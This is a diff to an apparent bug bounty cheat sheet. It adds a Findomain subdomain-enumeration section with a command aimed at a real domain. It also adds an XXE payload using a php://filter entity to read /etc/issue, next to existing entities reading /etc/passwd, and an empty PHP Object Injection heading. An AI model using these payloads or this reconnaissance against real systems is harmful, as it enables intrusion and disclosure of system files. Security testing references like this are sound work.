@@ -149,6 +149,34 @@ Needs SPYSE_API_TOKEN environment variable set (the free version always gives th
 
 
 
+
+
+
+
+#### Findomain
+
+```powershell
+#https://github.com/Edu4rdSHL/findomain
+
+Awesome little tool that can sometimes find domains amass cant - Also very quick as its built with rust :) 
+
+** Marked below require API Keys to work
+
+Certspotter
+Crt.sh
+Virustotal
+Sublist3r
+Facebook **
+Spyse (CertDB) *
+Bufferover
+Threadcrow
+Virustotal with apikey **
+
+findomain -t moj.io
+
+
+```
+
 #### WaybackURLs - Fetch all URL's that WayBackMachine Knows About a Domain
 
 ```powershell
@@ -1054,7 +1082,21 @@ Examples:
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://m0chan.github.io" > ]>
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
 
+
+We could also combine this with PHP Object Injection (More on that below) to have a payload like this 
+
+<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
+
 This is the basis, if you want the proper example go and buy the Bug Bounty Playbook.pdf :) Its my favourite book for bug bounty.
+```
+
+
+#### PHP Object Injection
+
+```powershell
+#https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/
+
+
 ```
 
 
